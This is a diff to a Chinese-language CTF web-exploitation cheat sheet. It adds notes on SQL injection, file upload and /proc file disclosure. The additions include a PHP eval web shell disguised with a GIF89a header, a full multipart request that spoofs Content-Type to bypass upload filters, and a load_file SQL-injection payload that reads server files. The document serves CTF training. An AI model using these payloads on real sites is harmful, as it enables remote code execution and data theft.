@@ -150,6 +150,7 @@ for i in files:
 - 堆叠注入+符号`||`的利用。例题:[EasySQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/EasySQL.md)
 - 联合查询（union select）会构造虚拟数据，利用此虚拟数据可以伪造登录。例题：[BabySQli](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/BabySQli.md)
 - 二分法异或盲注。例题:[[极客大挑战 2019]FinalSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL.md)
+- sql正则regexp+二次注入+updatexml报错注入。例题:[[RCTF2015]EasySQL](../../CTF/BUUCTF/Web/[RCTF2015]EasySQL.md)
 29. php使用读取文件的不同方式，可用于绕过滤。
 
 ```php
@@ -320,4 +321,36 @@ for i in range(1,256):
 ```
 
 45. php phar反序列化漏洞。例题:[[CISCN2019 华北赛区 Day1 Web1]Dropbox](../../CTF/BUUCTF/Web/[CISCN2019%20华北赛区%20Day1%20Web1]Dropbox.md)
-46. sql正则regexp+二次注入+updatexml报错注入。例题:[[RCTF2015]EasySQL](../../CTF/BUUCTF/Web/[RCTF2015]EasySQL.md)
+46. php文件上传一句话木马最基础绕过。在木马的开头加上GIF89a，上传文件时抓包改`Content-Type:`为图片。注意木马文件的`Content-Type:`改成什么都没事，重要的是后缀名。如果为了绕过过滤不得不改后缀名，就需要后续找别的漏洞把后缀改回来或者直接包含文件。
+
+```php
+GIF89a
+
+<?php @eval($_POST['shell']);?>
+````
+
+包如下（仅截取上传部分）：
+
+```
+------WebKitFormBoundaryXSmMYBArrqu5ODCM
+Content-Disposition: form-data; name="upload_file"; filename="shell.php" //这个名字很重要，保留php后缀名就能直接蚁剑连，否则需要找别的漏洞
+Content-Type: image/png //改成png，能绕过过滤的都行
+
+GIF89a
+
+<?php @eval($_POST['shell']);?>
+
+------WebKitFormBoundaryXSmMYBArrqu5ODCM
+Content-Disposition: form-data; name="submit"
+
+上传
+------WebKitFormBoundaryXSmMYBArrqu5ODCM--
+```
+
+47. sql注入如果没有过滤load_file，就能直接读取文件。例如：
+
+- ',\`address\`=(select(load_file('/flag.txt')))#
+
+可以直接在不爆表爆字段等任何信息的情况下直接读取到flag.txt文件。
+
+48.  [linux proc/pid/信息说明](https://blog.csdn.net/shenhuxi_yu/article/details/79697792)。/proc/self/cmdline可以读取当前进程执行的命令，如果是python的网站可以借此读取到网站的文件名。linux中如果打开了一个文件且没有关闭的话，`/proc/pid/fd/文件描述符`  这个目录会包含了进程打开的每一个文件，比如/proc/pid/fd/3读取第一个打开的文件。在python里使用open打开的只要不close，都能猜文件描述符而读取到。例题:[[网鼎杯 2020 白虎组]PicDown](https://blog.csdn.net/wuyaowangchuan/article/details/114540227)
